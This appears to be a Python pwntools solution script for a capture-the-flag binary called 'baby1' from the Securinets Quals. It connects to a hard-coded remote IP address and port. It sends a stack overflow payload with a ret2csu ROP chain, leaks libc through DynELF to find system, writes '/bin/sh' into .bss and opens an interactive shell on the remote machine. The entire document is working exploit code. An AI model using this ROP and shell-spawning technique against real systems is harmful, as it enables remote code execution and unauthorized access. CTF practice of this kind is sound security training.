#!/usr/bin/env python
# coding=utf-8
from pwn import *
a=remote("51.254.114.246",1111)
elf=ELF("./baby1")
write_got=elf.got["write"]
start_addr=0x400500
def leak(addr):
    a.recvuntil("Welcome to securinets Quals!\n")
    payload='A'*56
    payload+=p64(0x0000000004006BA)#csu
    payload+=p64(0)
    payload+=p64(1)
    payload+=p64(write_got)
    payload+=p64(8)
    payload+=p64(addr)
    payload+=p64(1)
    payload+=p64(0x0000000004006A0)#csu 
    payload+='A'*56
    payload+=p64(start_addr)
    a.sendline(payload)
    return a.recv(8)
d=DynELF(leak,elf=elf)
system_addr=d.lookup("system","libc")
log.info("system_addr = 0x%x"%(system_addr));

read_got=elf.got["read"]
def exp():
    a.recvuntil("Welcome to securinets Quals!\n")
    payload='A'*56
    payload+=p64(0x0000000004006BA)#csu
    payload+=p64(0)
    payload+=p64(1)
    payload+=p64(read_got)
    payload+=p64(10)
    payload+=p64(elf.bss())
    payload+=p64(0)
    payload+=p64(0x0000000004006A0)#csu 
    payload+='A'*56
    payload+=p64(0x00000000004006c3)
    payload+=p64(elf.bss())
    payload+=p64(system_addr)
    a.sendline(payload)
    sleep(0.1)
    a.sendline("/bin/sh")
    a.interactive()
exp()
